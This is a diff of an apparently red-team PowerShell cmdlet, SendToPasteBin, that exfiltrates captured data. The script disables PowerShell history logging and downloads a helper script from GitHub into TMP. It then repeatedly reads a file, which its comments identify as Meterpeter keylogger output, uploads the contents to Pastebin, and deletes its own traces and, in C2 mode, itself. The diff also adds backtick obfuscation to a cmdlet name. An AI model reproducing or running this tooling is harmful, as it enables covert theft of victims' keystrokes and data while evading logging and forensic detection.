@@ -4,9 +4,9 @@
     
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19042) x64 bits
-   Required Dependencies: Invoke-WebRequest {native}
+   Required Dependencies: Inv`oke-We`bRequ`est {native}
    Optional Dependencies: Out-PasteBin.ps1 {auto}
-   PS cmdlet Dev version: v1.1.4
+   PS cmdlet Dev version: v1.1.5
    
 .DESCRIPTION
    Uses Out-PasteBin.ps1 cmdlet to take the contents of -filepath 'string'
@@ -92,27 +92,27 @@
 )
 
 
-$cmdletVersion = "v1.1.4"
+$cmdletVersion = "v1.1.5"
 $ErrorActionPreference = "SilentlyContinue"
 #Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
-$host.UI.RawUI.WindowTitle = "@SendToPasteBin $cmdletVersion {SSA@RedTeam}"
+$host.UI.RawUI.WindowTitle = "SendToPasteBin $cmdletVersion"
 If($Egg -ieq "False")
 {
-   write-host "`n* Out-PasteBin aux cmdlet" -ForegroundColor Green
+   write-host "`n* SendToPasteBin aux cmdlet" -ForegroundColor Green
 }
 
-#Pastebin limmit ranges
+## Limmit ranges
 If($MaxPastes -gt 20)
 {
-   #Max pastes allowed
+   ## Max pastes allowed
    [int]$MaxPastes = 10
 }
 
-#Min loop jump timeout
+## Min loop jump timeout
 If($TimeOut -lt 120)
 {
-   #No time limmit if 1 paste
+   ## No time limmit if 1 paste
    If($MaxPastes -gt 1)
    {
       [int]$TimeOut = 120
@@ -120,65 +120,47 @@ If($TimeOut -lt 120)
 }
 
 
-#lOOP
 For($i=0; $i -lt $MaxPastes; $i++)
 {
-   Start-Sleep -Seconds $TimeOut #Loop jump timeout
+   Start-Sleep -Seconds $TimeOut ## Loop jump timeout
    If(-not(Test-Path -Path "$Env:TMP\Out-Pastebin.ps1" -EA SilentlyContinue))
    {
-      If($Egg -ieq "False")
-      {
-         write-host "*" -ForegroundColor Green -NoNewline;
-         write-host " Downloading Out-PasteBin cmdlet .." -ForegroundColor DarkGray
-      }
-
-      #Download Out-Pastebin cmdlet from my github repository
+      ## Download Out-Pastebin cmdlet from my github repository
+      If($Egg -ieq "False"){write-host "* Downloading Out-PasteBin cmdlet .." -ForegroundColor Green}
       iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Out-Pastebin.ps1" -OutFile "$Env:TMP\Out-Pastebin.ps1"|Unblock-File   
    }
 
    If($Egg -ieq "False")
    {
-      #Display OnScreen the loop counter!
-      write-host "  + " -ForegroundColor DarkYellow -NoNewline;
-      write-host "Maxpastes_Counter  : " -NoNewline;
-      write-host "${i}" -ForegroundColor Green -NoNewline;
-      write-host "º paste";
+      ## Display OnScreen the loop counter!
+      write-host "  + " -ForegroundColor DarkYellow -NoNewline
+      write-host "Maxpastes_Counter  : " -NoNewline
+      write-host "${i}" -ForegroundColor Green -NoNewline
+      write-host "º paste"
    }
 
-   #Make sure that -FilePath 'file' exists
+   ## Make sure that -FilePath 'file' exists
    If(Test-path -Path "$FilePath" -EA SilentlyContinue)
    {
-      #Parse filepath data (@Meterpeter keylogger)
-      $ParseDatas = Get-Content -Path "$FilePath"
+      ## Parse filepath data (@Meterpeter keylogger)
+      $ParseDatas = (Get-Content -Path "$FilePath")
       echo $ParseDatas > "$Env:TMP\ParseData.log"
 
-      Try{
-         #Import \ Execute module
-         $rand = (Get-Date -Format 'HH:mm:ss') -replace ':','_'
-         Import-Module -Name "$Env:TMP\Out-PasteBin.ps1" -Force
-         Out-Pastebin -InputObject $(Get-Content -Path "$Env:TMP\ParseData.log") -PasteTitle "${PasteTitle}_${rand}" -ExpiresIn "1W" -Visibility "Private" -PastebinUsername "$PastebinUsername" -PastebinPassword "$PastebinPassword" -PastebinDeveloperKey "$PastebinDeveloperKey"
-      }
-      Catch
-      {
-         If($Egg -ieq "False")
-         {
-            write-host "* Error:" -ForegroundColor Red -NoNewline;
-            write-host " Fail to execute Out-PasteBin cmdlet .." -ForegroundColor DarkGray
-         }
-         break
-      }
+      $rand = (Get-Date -Format 'HH:mm:ss') -replace ':','_'
+      Import-Module -Name "$Env:TMP\Out-PasteBin.ps1" -Force
+      Out-Pastebin -InputObject $(Get-Content -Path "$Env:TMP\ParseData.log") -PasteTitle "${PasteTitle}_${rand}" -ExpiresIn "1W" -Visibility "Private" -PastebinUsername "$PastebinUsername" -PastebinPassword "$PastebinPassword" -PastebinDeveloperKey "$PastebinDeveloperKey"
 
-      #Cleanup
+      ## Local Cleanup
       Remove-Item -Path "$Env:TMP\parsedata.log" -Force
    }
 }
 
 
-#Cleanup
+## Cleanup
 Remove-Item -Path "$Env:TMP\parsedata.log" -Force
 Remove-Item -Path "$Env:TMP\Out-PasteBin.ps1" -Force
 If($Egg -ieq "True")
 {
-   #Auto-Delete this cmdlet (@Meterpeter C2 internal function)
+   ## Auto-Delete this cmdlet (@Meterpeter C2 internal function)
    Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 }
